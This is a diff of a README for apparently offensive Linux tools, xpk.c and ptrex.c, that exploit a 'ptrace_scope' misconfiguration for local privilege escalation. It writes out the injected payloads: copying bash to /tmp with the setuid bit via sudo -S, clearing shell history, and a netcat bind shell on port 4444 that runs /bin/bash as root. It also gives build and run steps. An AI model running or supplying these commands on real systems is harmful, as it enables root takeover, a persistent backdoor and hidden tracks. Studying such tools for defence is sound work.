@@ -20,14 +20,19 @@ based from (GDB dep): https://www.exploit-db.com/exploits/46989
 'ptrace_scope' misconfiguration Local Privilege Escalation by Marcelo Vazquez (s4vitar) & Victor Lasa (vowkin)
 
 ## xpk.c
-Local Privilege Escalation via stdin hijack (using ptrace_do lib https://github.com/emptymonkey/ptrace_do): sudo -S cp /bin/bash /tmp + sudo -S chmod +s /tmp/bash + history -c 
+stdin hijack (using ptrace_do lib https://github.com/emptymonkey/ptrace_do): sudo -S cp /bin/bash /tmp + sudo -S chmod +s /tmp/bash + history -c 
 ```
 gcc -o xpk xpk.c
 ./xpk
 ```
 
+WARNING: only works for x86_64 systems (ptrace_do limitation)
+
+* can inject code from x86_64-ptrex-compiled to x86_64 process
+* can inject code from x86_64-ptrex-compiled to x86 process
+
 ## ptrex.c:
-Local Privilege Escalation via shellcode injection execve + python -c import os; os.system("echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1"); import pty; pty.spawn("/bin/bash");
+shellcode injection (using ptrace) execve(python -c import os; os.system("echo | sudo -S cp /bin/bash /tmp >/dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash >/dev/null 2>&1")); 
 ```
 gcc -o ptrex ptrex.c
  ./ptrex 
@@ -37,6 +42,13 @@ You can also inject your own python code: ./ptrex full_python_path newcmdline
 ```
 ./ptrex /home/dreg/tmp/python 'import os; os.system("/usr/bin/sudo /bin/nc -lvp 4444 -e /bin/bash")'
 ```
+
+* works for x86_64 systems & x86 systems
+* can inject code from x86_64-ptrex-compiled to x86_64 process
+* can inject code from x86-ptrex-compiled to x86 process
+* can inject code from x86_64-ptrex-compiled to x86 process
+
+WARNING: inject code from x86-ptrex-compiled to x86_x64 process is not possible
 
 ## How to test xpk.c:
 Open a terminal with a sudo user group
